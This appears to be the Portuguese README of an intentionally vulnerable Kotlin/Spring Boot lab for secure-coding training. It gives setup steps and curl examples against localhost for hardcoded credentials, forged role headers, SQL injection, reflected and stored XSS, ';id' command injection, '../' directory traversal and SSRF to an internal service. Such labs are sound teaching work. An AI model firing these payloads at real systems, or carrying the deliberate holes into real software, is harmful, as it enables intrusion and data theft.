# Vulnerable Lab - Kotlin + Spring Boot

Aplicação propositalmente vulnerável para treinamento de desenvolvimento seguro.

## Execução

### Docker (recomendado)
```bash
docker compose build
docker compose up -d
# Logs
docker compose logs -f
```
- A aplicação sobe em: http://localhost:8080
- O Postgres sobe em: localhost:5432 (db: `vulndb`, user: `vuln`, senha: `vuln`)
- Um alvo interno para SSRF é iniciado como `webtarget` (não exposto no host)

### Local (sem Docker)
Pré-requisitos: JDK 17, Maven e Postgres local.
1) Suba um Postgres local com as credenciais:
   - DB: `vulndb`
   - USER: `vuln`
   - PASS: `vuln`
2) Ajuste `src/main/resources/application.properties` se necessário.
3) Rode a aplicação:
```bash
mvn spring-boot:run
```

## Endpoints e exemplos de exploração
Atenção: estes endpoints são intencionalmente INSEGUROS. Não use em produção.

### 1) Hardcoded Credentials + Broken Access Control
- Login com credenciais hardcoded
```bash
curl -i -X POST "http://localhost:8080/auth/login?username=admin&password=admin123"
```
- Leitura de perfil de outro usuário (BAC)
```bash
# Note o uso de token fake e escolha arbitrária do parâmetro user
curl -i -H "Authorization: Bearer token-FAKE-admin" \
  "http://localhost:8080/auth/profile?user=alice"
```
- Ação administrativa baseada em header manipulável
```bash
curl -i -X POST "http://localhost:8080/auth/admin/reset?targetUser=bob" \
  -H "X-User-Role: admin"
```

### 2) SQL Injection
- Consulta vulnerável com concatenação de SQL
```bash
curl -s "http://localhost:8080/sqli/search?q=alice' OR '1'='1" | jq .
```

### 3) Reflected XSS
- Reflected XSS em resposta HTML
```bash
curl -s "http://localhost:8080/xss/reflected?q=<script>alert(1)</script>"
# Ou abrir no navegador para ver o alerta
```

### 4) Persistent XSS (Stored XSS)
- Inserir conteúdo malicioso
```bash
curl -i -X POST "http://localhost:8080/xss/store" \
  --data-urlencode "author=alice" \
  --data-urlencode "content=<script>alert('xss')</script>"
```
- Listar posts (renderiza sem sanitização)
```bash
curl -s "http://localhost:8080/xss/list"
# Abrir no navegador para observar a execução de JS
```

### 5) Command Injection
- Execução de comando ao concatenar entrada do usuário no shell
```bash
# Unix/Linux: injeta ";id" após o host
curl -s "http://localhost:8080/cmd/ping?host=127.0.0.1;id"
```

### 6) Directory Traversal
- Leitura de arquivo permitido
```bash
curl -s "http://localhost:8080/files/view?name=teste.txt"
```
- Tentativa de fuga de diretório
```bash
curl -s "http://localhost:8080/files/view?name=../pom.xml"
```

### 7) SSRF (Server-Side Request Forgery)
- Busca de URL arbitrária pelo servidor
```bash
curl -s "http://localhost:8080/ssrf/fetch?url=http://example.com"
```
- Acessar alvo interno (não acessível pelo host) via rede do compose
```bash
# Alvo interno: serviço 'webtarget' (nginx servindo /usr/share/nginx/html)
curl -s "http://localhost:8080/ssrf/fetch?url=http://webtarget"          # index.html
curl -s "http://localhost:8080/ssrf/fetch?url=http://webtarget/index.html"
```

## Banco de Dados
- Em Docker: o schema e os dados são aplicados automaticamente via `schema.sql` e `data.sql` na inicialização.
- Credenciais (padrão):
  - Host: `db` (Docker) / `localhost` (local)
  - Porta: `5432`
  - DB: `vulndb`
  - User: `vuln`
  - Senha: `vuln`

## Estrutura principal
- `pom.xml`
- `src/main/kotlin/com/example/vulnlab/`
  - `VulnLabApplication.kt`
  - `config/Beans.kt`
  - `controllers/`
    - `AuthController.kt` (Hardcoded Creds, BAC)
    - `SqliController.kt` (SQLi)
    - `XssController.kt` (Reflected/Stored XSS)
    - `CommandController.kt` (Command Injection)
    - `FilesController.kt` (Directory Traversal)
    - `SsrfController.kt` (SSRF)
- `src/main/resources/`
  - `application.properties`, `schema.sql`, `data.sql`
- `Dockerfile`, `docker-compose.yml`
- `uploads/teste.txt`, `ssrf-target/index.html`

## Aviso Importante
Este projeto é para fins educacionais em ambiente controlado. Não execute em redes ou ambientes sensíveis. As técnicas demonstradas são perigosas quando aplicadas indevidamente. Use com responsabilidade.
